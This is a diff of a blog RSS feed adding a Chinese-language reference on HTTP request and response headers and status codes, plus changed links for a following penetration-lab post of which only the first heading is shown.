+&lt;p&gt;Host&lt;/p&gt;
+&lt;p&gt;指定请求的服务器的域名和端口号Host: &lt;a class=&#34;link&#34; href=&#34;https://www.github.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;www.github.com&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;If-Match&lt;/p&gt;
+&lt;p&gt;只有请求内容与实体相匹配才有效If-Match: &amp;ldquo;737060cd8c284d8af7ad3082f209582d&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;If-Modified-Since&lt;/p&gt;
+&lt;p&gt;如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;If-None-Match&lt;/p&gt;
+&lt;p&gt;如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变If-None-Match: &amp;ldquo;737060cd8c284d8af7ad3082f209582d&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;If-Range&lt;/p&gt;
+&lt;p&gt;如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为EtagIf-Range: &amp;ldquo;737060cd8c284d8af7ad3082f209582d&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;If-Unmodified-Since&lt;/p&gt;
+&lt;p&gt;只在实体在指定时间之后未被修改才请求成功If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Max-Forwards&lt;/p&gt;
+&lt;p&gt;限制信息通过代理和网关传送的时间Max-Forwards: 10&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Pragma&lt;/p&gt;
+&lt;p&gt;用来包含实现特定的指令Pragma: no-cache&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Proxy-Authorization&lt;/p&gt;
+&lt;p&gt;连接到代理的授权证书Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Range&lt;/p&gt;
+&lt;p&gt;只请求实体的一部分，指定范围Range: bytes=500-999&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Referer&lt;/p&gt;
+&lt;p&gt;先前网页的地址，当前请求网页紧随其后,即来路Referer: &lt;a class=&#34;link&#34; href=&#34;http://www.zcmhi.com/archives/71.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.zcmhi.com/archives/71.html&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;TE&lt;/p&gt;
+&lt;p&gt;客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息TE: trailers,deflate;q=0.5&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Upgrade&lt;/p&gt;
+&lt;p&gt;向服务器指定某种传输协议以便服务器进行转换（如果支持）Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;User-Agent&lt;/p&gt;
+&lt;p&gt;User-Agent的内容包含发出请求的用户信息User-Agent: Mozilla/5.0 (Linux; X11)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Via&lt;/p&gt;
+&lt;p&gt;通知中间网关或代理服务器地址，通信协议Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Warning&lt;/p&gt;
+&lt;p&gt;关于消息实体的警告信息Warn: 199 Miscellaneous warning&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2713-响应头列表&#34;&gt;2.7.1.3. 响应头列表
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Accept-Ranges&lt;/p&gt;
+&lt;p&gt;表明服务器是否支持指定范围请求及哪种类型的分段请求Accept-Ranges: bytes&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Access-Control-Allow-Origin&lt;/p&gt;
+&lt;p&gt;配置有权限访问资源的域Access-Control-Allow-Origin: &lt;origin&gt;|*&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Age&lt;/p&gt;
+&lt;p&gt;从原始服务器到代理缓存形成的估算时间（以秒计，非负）Age: 12&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Allow&lt;/p&gt;
+&lt;p&gt;对某网络资源的有效的请求行为，不允许则返回405Allow: GET, HEAD&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Cache-Control&lt;/p&gt;
+&lt;p&gt;告诉所有的缓存机制是否可以缓存及哪种类型Cache-Control: no-cache&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Encoding&lt;/p&gt;
+&lt;p&gt;web服务器支持的返回内容压缩编码类型。Content-Encoding: gzip&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Language&lt;/p&gt;
+&lt;p&gt;响应体的语言Content-Language: en,zh&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Length&lt;/p&gt;
+&lt;p&gt;响应体的长度Content-Length: 348&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Location&lt;/p&gt;
+&lt;p&gt;请求资源可替代的备用的另一地址Content-Location: /index.htm&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-MD5&lt;/p&gt;
+&lt;p&gt;返回资源的MD5校验值Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Range&lt;/p&gt;
+&lt;p&gt;在整个返回体中本部分的字节位置Content-Range: bytes 21010-47021/47022&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Type&lt;/p&gt;
+&lt;p&gt;返回内容的MIME类型Content-Type: text/html; charset=utf-8&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Date&lt;/p&gt;
+&lt;p&gt;原始服务器消息发出的时间Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;ETag&lt;/p&gt;
+&lt;p&gt;请求变量的实体标签的当前值ETag: &amp;ldquo;737060cd8c284d8af7ad3082f209582d&amp;rdquo;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Expires&lt;/p&gt;
+&lt;p&gt;响应过期的日期和时间Expires: Thu, 01 Dec 2010 16:00:00 GMT&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Last-Modified&lt;/p&gt;
+&lt;p&gt;请求资源的最后修改时间Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Location&lt;/p&gt;
+&lt;p&gt;用来重定向接收方到非请求URL的位置来完成请求或标识新的资源Location: &lt;a class=&#34;link&#34; href=&#34;http://www.zcmhi.com/archives/94.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.zcmhi.com/archives/94.html&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Pragma&lt;/p&gt;
+&lt;p&gt;包括实现特定的指令，它可应用到响应链上的任何接收方Pragma: no-cache&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Proxy-Authenticate&lt;/p&gt;
+&lt;p&gt;它指出认证方案和可应用到代理的该URL上的参数Proxy-Authenticate: Basic&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Refresh&lt;/p&gt;
+&lt;p&gt;应用于重定向或一个新的资源被创造，在5秒之后重定向（由网景提出，被大部分浏览器支持）Refresh: 5; url=http://www.zcmhi.com/archives/94.html&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Retry-After&lt;/p&gt;
+&lt;p&gt;如果实体暂时不可取，通知客户端在指定时间之后再次尝试Retry-After: 120&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Server&lt;/p&gt;
+&lt;p&gt;web服务器软件名称Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Set-Cookie&lt;/p&gt;
+&lt;p&gt;设置Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Strict-Transport-Security&lt;/p&gt;
+&lt;p&gt;设置浏览器强制使用HTTPS访问max-age: x秒的时间内 访问对应域名都使用HTTPS请求includeSubDomains: 网站的子域名也启用规则Strict-Transport-Security: max-age=1000; includeSubDomains&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Trailer&lt;/p&gt;
+&lt;p&gt;指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Transfer-Encoding&lt;/p&gt;
+&lt;p&gt;文件传输编码Transfer-Encoding:chunked&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Vary&lt;/p&gt;
+&lt;p&gt;告诉下游代理是使用缓存响应还是从原始服务器请求Vary: *&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Via&lt;/p&gt;
+&lt;p&gt;告知代理客户端响应是通过哪里发送的Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Warning&lt;/p&gt;
+&lt;p&gt;警告实体可能存在的问题Warning: 199 Miscellaneous warning&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;WWW-Authenticate&lt;/p&gt;
+&lt;p&gt;表明客户端请求实体应该使用的授权方案WWW-Authenticate: Basic&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;X-Content-Type-Options&lt;/p&gt;
+&lt;p&gt;配置禁止MIME类型嗅探X-Content-Type-Options: nosniff&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;X-Frame-Options&lt;/p&gt;
+&lt;p&gt;配置页面是否能出现在 &lt;frame&gt;, &lt;iframe&gt;, &lt;embed&gt;, &lt;object&gt; 等标签中，防止点击劫持X-Frame-Options: deny&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;X-XSS-Protection&lt;/p&gt;
+&lt;p&gt;配置XSS防护机制X-XSS-Protection: 1; mode=block&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2714-http状态返回代码-1xx临时响应&#34;&gt;2.7.1.4. HTTP状态返回代码 1xx（临时响应）
+&lt;/h2&gt;&lt;p&gt;表示临时响应并需要请求者继续执行操作的状态代码。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Code&lt;/th&gt;
+          &lt;th&gt;代码&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;100&lt;/td&gt;
+          &lt;td&gt;继续&lt;/td&gt;
+          &lt;td&gt;服务器返回此代码表示已收到请求的第一部分，正在等待其余部分&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;101&lt;/td&gt;
+          &lt;td&gt;切换协议&lt;/td&gt;
+          &lt;td&gt;请求者已要求服务器切换协议，服务器已确认并准备切换&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;2715-http状态返回代码-2xx-成功&#34;&gt;2.7.1.5. HTTP状态返回代码 2xx （成功）
+&lt;/h2&gt;&lt;p&gt;表示成功处理了请求的状态代码。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Code&lt;/th&gt;
+          &lt;th&gt;代码&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;200&lt;/td&gt;
+          &lt;td&gt;成功&lt;/td&gt;
+          &lt;td&gt;服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;201&lt;/td&gt;
+          &lt;td&gt;已创建&lt;/td&gt;
+          &lt;td&gt;请求成功并且服务器创建了新的资源&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;202&lt;/td&gt;
+          &lt;td&gt;已接受&lt;/td&gt;
+          &lt;td&gt;服务器已接受请求，但尚未处理&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;203&lt;/td&gt;
+          &lt;td&gt;非授权信息&lt;/td&gt;
+          &lt;td&gt;服务器已成功处理了请求，但返回的信息可能来自另一来源&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;204&lt;/td&gt;
+          &lt;td&gt;无内容&lt;/td&gt;
+          &lt;td&gt;服务器成功处理了请求，但没有返回任何内容&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;205&lt;/td&gt;
+          &lt;td&gt;重置内容&lt;/td&gt;
+          &lt;td&gt;m服务器成功处理了请求，但没有返回任何内容&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;206&lt;/td&gt;
+          &lt;td&gt;部分内容&lt;/td&gt;
+          &lt;td&gt;服务器成功处理了部分GET请求&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;2716-http状态返回代码-3xx-重定向&#34;&gt;2.7.1.6. HTTP状态返回代码 3xx （重定向）
+&lt;/h2&gt;&lt;p&gt;表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Code&lt;/th&gt;
+          &lt;th&gt;代码&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;300&lt;/td&gt;
+          &lt;td&gt;多种选择&lt;/td&gt;
+          &lt;td&gt;针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;301&lt;/td&gt;
+          &lt;td&gt;永久移动&lt;/td&gt;
+          &lt;td&gt;请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;302&lt;/td&gt;
+          &lt;td&gt;临时移动&lt;/td&gt;
+          &lt;td&gt;服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;303&lt;/td&gt;
+          &lt;td&gt;查看其他位置&lt;/td&gt;
+          &lt;td&gt;请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;304&lt;/td&gt;
+          &lt;td&gt;未修改&lt;/td&gt;
+          &lt;td&gt;自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;305&lt;/td&gt;
+          &lt;td&gt;使用代理&lt;/td&gt;
+          &lt;td&gt;请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;307&lt;/td&gt;
+          &lt;td&gt;临时重定向&lt;/td&gt;
+          &lt;td&gt;服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;2717-http状态返回代码-4xx请求错误&#34;&gt;2.7.1.7. HTTP状态返回代码 4xx（请求错误）
+&lt;/h2&gt;&lt;p&gt;这些状态代码表示请求可能出错，妨碍了服务器的处理。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Code&lt;/th&gt;
+          &lt;th&gt;代码&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;400&lt;/td&gt;
+          &lt;td&gt;错误请求&lt;/td&gt;
+          &lt;td&gt;服务器不理解请求的语法。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;401&lt;/td&gt;
+          &lt;td&gt;未授权&lt;/td&gt;
+          &lt;td&gt;请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;403&lt;/td&gt;
+          &lt;td&gt;禁止&lt;/td&gt;
+          &lt;td&gt;服务器拒绝请求。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;404&lt;/td&gt;
+          &lt;td&gt;未找到&lt;/td&gt;
+          &lt;td&gt;服务器找不到请求的网页。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;405&lt;/td&gt;
+          &lt;td&gt;方法禁用&lt;/td&gt;
+          &lt;td&gt;禁用请求中指定的方法。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;406&lt;/td&gt;
+          &lt;td&gt;不接受&lt;/td&gt;
+          &lt;td&gt;无法使用请求的内容特性响应请求的网页。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;407&lt;/td&gt;
+          &lt;td&gt;需要代理授权&lt;/td&gt;
+          &lt;td&gt;此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;408&lt;/td&gt;
+          &lt;td&gt;请求超时&lt;/td&gt;
+          &lt;td&gt;服务器等候请求时发生超时。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;409&lt;/td&gt;
+          &lt;td&gt;冲突&lt;/td&gt;
+          &lt;td&gt;服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;410&lt;/td&gt;
+          &lt;td&gt;已删除&lt;/td&gt;
+          &lt;td&gt;如果请求的资源已永久删除，服务器就会返回此响应。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;411&lt;/td&gt;
+          &lt;td&gt;需要有效长度&lt;/td&gt;
+          &lt;td&gt;服务器不接受不含有效内容长度标头字段的请求。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;412&lt;/td&gt;
+          &lt;td&gt;未满足前提条件&lt;/td&gt;
+          &lt;td&gt;服务器未满足请求者在请求中设置的其中一个前提条件。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;413&lt;/td&gt;
+          &lt;td&gt;请求实体过大&lt;/td&gt;
+          &lt;td&gt;服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;414&lt;/td&gt;
+          &lt;td&gt;请求的 URI 过长&lt;/td&gt;
+          &lt;td&gt;请求的 URI（通常为网址）过长，服务器无法处理。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;415&lt;/td&gt;
+          &lt;td&gt;不支持的媒体类型&lt;/td&gt;
+          &lt;td&gt;请求的格式不受请求页面的支持。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;416&lt;/td&gt;
+          &lt;td&gt;请求范围不符合要求&lt;/td&gt;
+          &lt;td&gt;如果页面无法提供请求的范围，则服务器会返回此状态代码。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;417&lt;/td&gt;
+          &lt;td&gt;未满足期望值&lt;/td&gt;
+          &lt;td&gt;服务器未满足&amp;quot;期望&amp;quot;请求标头字段的要求。&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;2718-http状态返回代码-5xx服务器错误&#34;&gt;2.7.1.8. HTTP状态返回代码 5xx（服务器错误）
+&lt;/h2&gt;&lt;p&gt;这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Code&lt;/th&gt;
+          &lt;th&gt;代码&lt;/th&gt;
+          &lt;th&gt;说明&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;500&lt;/td&gt;
+          &lt;td&gt;服务器内部错误&lt;/td&gt;
+          &lt;td&gt;服务器遇到错误，无法完成请求。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;501&lt;/td&gt;
+          &lt;td&gt;尚未实施&lt;/td&gt;
+          &lt;td&gt;服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;502&lt;/td&gt;
+          &lt;td&gt;错误网关&lt;/td&gt;
+          &lt;td&gt;服务器作为网关或代理，从上游服务器收到无效响应。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;503&lt;/td&gt;
+          &lt;td&gt;服务不可用&lt;/td&gt;
+          &lt;td&gt;服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;504&lt;/td&gt;
+          &lt;td&gt;网关超时&lt;/td&gt;
+          &lt;td&gt;服务器作为网关或代理，但是没有及时从上游服务器收到请求。&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;505&lt;/td&gt;
+          &lt;td&gt;HTTP 版本不受支持&lt;/td&gt;
+          &lt;td&gt;服务器不支持请求中所用的 HTTP 协议版本。&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</description>
+        </item>
+        <item>
         <title>红日内网靶场1</title>
-        <link>http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</link>
+        <link>https://2477231995.github.io/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</link>
         <pubDate>Sun, 08 Dec 2024 12:19:00 +0800</pubDate>
         
-        <guid>http://gucheng.me/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</guid>
+        <guid>https://2477231995.github.io/p/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA1/</guid>
         <description>&lt;h3 id=&#34;1环境搭建&#34;&gt;1.环境搭建
